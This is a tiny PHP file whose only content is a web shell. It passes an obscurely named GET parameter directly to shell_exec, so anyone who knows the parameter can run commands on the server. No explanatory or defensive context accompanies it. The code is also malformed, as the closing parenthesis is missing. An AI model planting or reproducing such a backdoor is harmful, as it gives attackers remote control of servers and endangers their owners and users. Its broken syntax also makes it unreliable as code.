<?php
shell_exec($_GET['--I6Eyuy'];
?>
